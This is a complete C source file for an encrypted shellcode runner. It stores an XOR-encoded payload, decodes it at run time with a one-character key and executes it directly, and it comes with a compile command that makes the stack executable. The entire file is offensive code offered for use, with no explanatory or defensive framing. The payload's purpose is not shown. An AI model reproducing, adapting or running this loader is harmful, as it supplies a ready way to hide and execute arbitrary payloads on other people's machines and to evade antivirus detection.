#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Compile With: gcc -o main.bin main.c -z execstack

// Our encrypted shellcode
unsigned char buf[] = 
"\x86\x4a\x36\x3e\x32\xdd\x23\x91\xc3\x18\x90\x3a\x34\x3e\x33"
"\xe7\x6b\x5d\x6a\x25\x92\xaa\x25\x92\xab\x0b\xec\x52\x4c\xa6"
"\x19\x6a\xed\x53\x23\x18\x87\x86\x8b\x92\x8c\x85\xb9\x92\x92"
"\x92\x6b\x23\x23\x5a\x94\x01\x62\x33\xf2\xdd\x7b\x23\xe2\xbd"
"\x26\x5a\xa2\x01\x49\x2a\x31\xd9\x6c\x64\x6e\x23\xee\xab\x13"
"\x3a\x01\x61\x2a\x32\x3b\x01\x42\x33\xf2\x01\x69\x34\x01\x6a"
"\x35\x64\x6e\x23\xee\xab\x13\x50\x23\xfc\x23\xd2\x69\x6b\x6a"
"\xd0\xab\xc3\x5a\x31\x3a\x23\xe2\x8d\x01\x7b\x31\x01\x41\x33"
"\x64\x6e\x32\x23\xee\xab\x12\x4e\x22\x94\xa2\x1f\x73\x3c\x01"
"\x48\x33\x01\x6b\x01\x6e\x23\xe2\x8c\x23\x5a\x9d\x64\x6e\x32"
"\x32\x34\x23\xee\xab\x12\xac\x01\x57\x33\x01\x6a\x34\x64\x6e"
"\x35\x01\x15\x31\x64\x6e\x23\xee\xab\x13\x86\x94\x8d\x4c\xa6";

int main (int argc, char **argv)
{
	char xor_key = 'm';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
	int (*ret)() = (int(*)())buf;
	ret();
}
